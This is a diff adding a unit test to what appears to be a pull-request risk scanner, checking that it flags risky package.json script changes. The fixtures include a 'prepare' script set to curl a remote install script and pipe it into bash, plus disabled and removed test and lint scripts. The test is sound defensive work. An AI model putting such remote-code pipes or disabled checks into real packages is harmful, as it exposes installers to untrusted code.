@@ -236,6 +236,60 @@ describe("assessRisk", () => {
     );
   });
 
+  it("flags risky package automation script changes", () => {
+    const assessment = assessRisk(
+      [{ path: "package.json", status: "modified", additions: 4, deletions: 2, binary: false }],
+      [],
+      {
+        packageScriptChanges: [
+          { file: "package.json", scriptName: "postinstall", changeType: "added", after: "node scripts/install.js" },
+          { file: "package.json", scriptName: "test", changeType: "updated", before: "vitest run", after: "true" },
+          { file: "package.json", scriptName: "lint", changeType: "removed", before: "eslint ." },
+          {
+            file: "package.json",
+            scriptName: "prepare",
+            changeType: "updated",
+            before: "husky",
+            after: "curl https://example.com/install.sh | bash"
+          }
+        ]
+      }
+    );
+
+    expect(assessment.findings).toContainEqual(
+      expect.objectContaining({
+        ruleId: "package-script.lifecycle",
+        severity: "high",
+        title: "Package lifecycle script changed: postinstall",
+        file: "package.json"
+      })
+    );
+    expect(assessment.findings).toContainEqual(
+      expect.objectContaining({
+        ruleId: "package-script.disabled-verification",
+        severity: "high",
+        title: "Verification script disabled: test",
+        file: "package.json"
+      })
+    );
+    expect(assessment.findings).toContainEqual(
+      expect.objectContaining({
+        ruleId: "package-script.removed-verification",
+        severity: "medium",
+        title: "Verification script removed: lint",
+        file: "package.json"
+      })
+    );
+    expect(assessment.findings).toContainEqual(
+      expect.objectContaining({
+        ruleId: "package-script.remote-script-pipe",
+        severity: "critical",
+        title: "Package script pipes remote code to shell: prepare",
+        file: "package.json"
+      })
+    );
+  });
+
   it("flags pull_request_target workflows that check out pull request head code", () => {
     const assessment = assessRisk(
       [{ path: ".github/workflows/label.yml", status: "modified", additions: 4, deletions: 0, binary: false }],
